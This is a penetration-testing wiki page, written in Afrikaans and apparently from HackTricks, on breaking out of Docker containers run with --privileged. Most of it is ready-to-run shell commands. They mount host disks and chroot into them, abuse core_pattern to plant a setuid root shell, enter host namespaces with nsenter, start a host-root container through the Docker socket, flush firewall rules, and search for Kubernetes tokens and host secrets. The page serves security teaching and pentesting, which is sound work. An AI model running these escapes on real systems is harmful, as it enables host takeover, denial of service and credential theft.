# Ontsnap Uit `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

’n Container wat met `--privileged` begin word, is nie dieselfde as ’n normale container met een of twee ekstra toestemmings nie. In die praktyk verwyder of verswak `--privileged` verskeie van die verstek-runtime-beskermings wat normaalweg die werklading weg hou van gevaarlike gasheerhulpbronne. Die presiese uitwerking hang steeds van die runtime en gasheer af, maar vir Docker is die gewone resultaat:

- alle capabilities word toegestaan
- die device cgroup-beperkings word opgehef
- baie kernel-lêerstelsels word nie meer read-only gemount nie
- verstek-gemaskerde procfs-paaie verdwyn
- seccomp-filtering word gedeaktiveer
- AppArmor-beperking word gedeaktiveer
- SELinux-isolasie word gedeaktiveer of met ’n veel breër label vervang

Die belangrike gevolg is dat ’n privileged container gewoonlik **nie** ’n subtiele kernel exploit nodig het nie. In baie gevalle kan dit eenvoudig direk met gasheertoestelle, gasheergerigte kernel-lêerstelsels of runtime-koppelvlakke kommunikeer en dan na ’n gasheer-shell pivot.

## Wat `--privileged` Nie Outomaties Verander Nie

`--privileged` voeg jou **nie** outomaties by die gasheer se PID-, netwerk-, IPC- of UTS-namespaces aan nie. ’n Privileged container kan steeds private namespaces hê. Dit beteken dat sommige escape chains ’n ekstra voorwaarde vereis, soos:

- ’n gasheer-bind mount
- gedeelde gasheer-PID’s
- gasheernetwerking
- sigbare gasheertoestelle
- skryfbare proc/sys-koppelvlakke

Daardie toestande is dikwels maklik om in werklike miskonfigurasies te bevredig, maar hulle is konseptueel apart van `--privileged` self.

## Escape-paaie

### 1. Mount Die Gasheerskyf Deur Blootgestelde Toestelle

’n Privileged container sien gewoonlik baie meer device nodes onder `/dev`. As die gasheer se block device sigbaar is, is die eenvoudigste escape om dit te mount en in die gasheerlêerstelsel te `chroot`:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
As die root-partisie nie voor die hand liggend is nie, lys eers die blokuitleg:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
As die praktiese benadering is om ’n setuid-helper in ’n skryfbare host-mount te plaas eerder as om te `chroot`, onthou dat nie elke filesystem die setuid-bit eerbiedig nie. ’n Vinnige capability check aan die host-kant is:
```bash
mount | grep -v "nosuid"
```
Dit is nuttig omdat skryfbare paaie onder `nosuid`-lêerstelsels veel minder interessant is vir klassieke werkvloeie soos "drop a setuid shell and execute it later".

Die verswakte beskermings wat hier misbruik word, is:

- volledige toestelblootstelling
- breë capabilities, veral `CAP_SYS_ADMIN`

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Of Hergebruik ’n Host Bind Mount En `chroot`

As die host se wortellêerstelsel reeds binne die container gemount is, of as die container die nodige mounts kan skep omdat dit privileged is, is ’n host-shell dikwels slegs een `chroot` weg:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As daar geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Hierdie pad misbruik:

- verswakte mount restrictions
- full capabilities
- gebrek aan MAC confinement

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Misbruik van skryfbare `/proc/sys` of `/sys`

Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskerming baie swakker word. Dit kan kernel-koppelvlakke wat op die host gerig is, blootstel wat normaalweg gemasker of read-only gemount word.

’n Klassieke voorbeeld is `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ander waardevolle paaie sluit in:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Hierdie pad maak misbruik van:

- ontbrekende gemaskerde paaie
- ontbrekende leesalleen-stelselpaie

Verwante bladsye:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Gebruik volledige capabilities vir mount- of namespace-gebaseerde ontsnapping

’n Bevoorregte container kry die capabilities wat normaalweg van standaardcontainers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` en vele ander. Dit is dikwels genoeg om ’n plaaslike foothold in ’n host-ontsnapping te omskep sodra nog ’n blootgestelde oppervlak bestaan.

’n Eenvoudige voorbeeld is om bykomende lêerstelsels te mount en namespace entry te gebruik:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
As die host-PID ook gedeel word, word die stap selfs korter:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Hierdie pad misbruik:

- die verstek privileged capability set
- opsionele host PID-sharing

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Ontsnap deur Runtime Sockets

’n privileged container eindig dikwels met host-runtime-toestand of sockets wat sigbaar is. As ’n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om ’n tweede container met host-toegang te begin:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Vir containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Hierdie pad misbruik:

- blootstelling van geprivilegieerde runtime
- host bind mounts wat deur die runtime self geskep word

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Verwyder newe-effekte van Network Isolation

`--privileged` sluit nie vanself by die host network namespace aan nie, maar as die container ook `--network=host` of ander host-network-toegang het, word die volledige network stack veranderbaar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit is nie altyd ’n direkte host-shell nie, maar dit kan denial of service, traffic interception of toegang tot loopback-only management services moontlik maak.

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lees Host Secrets En Runtime State

Selfs wanneer ’n skoon shell escape nie onmiddellik moontlik is nie, het privileged containers dikwels genoeg toegang om host secrets, kubelet-state, runtime metadata en naburige container-filesystems te lees:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
As `/var` op die host gemonteer is of die runtime-gidse sigbaar is, kan dit genoeg wees vir laterale beweging of diefstal van cloud/Kubernetes-geloofsbriewe selfs voordat ’n host-shell verkry is.

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroles

Die doel van die volgende commands is om te bevestig watter ontsnappingsfamilies vir bevoorregte containers onmiddellik uitvoerbaar is.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Wat hier interessant is:

- ’n volledige capability-stel, veral `CAP_SYS_ADMIN`
- skryfbare proc/sys-blootstelling
- sigbare host-toestelle
- ontbrekende seccomp- en MAC-beperking
- runtime-sockets of host-root-bind mounts

Enige een hiervan kan genoeg wees vir post-exploitation. Verskeie saam beteken gewoonlik dat die container funksioneel net een of twee commands van host compromise verwyder is.

## Verwante bladsye

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
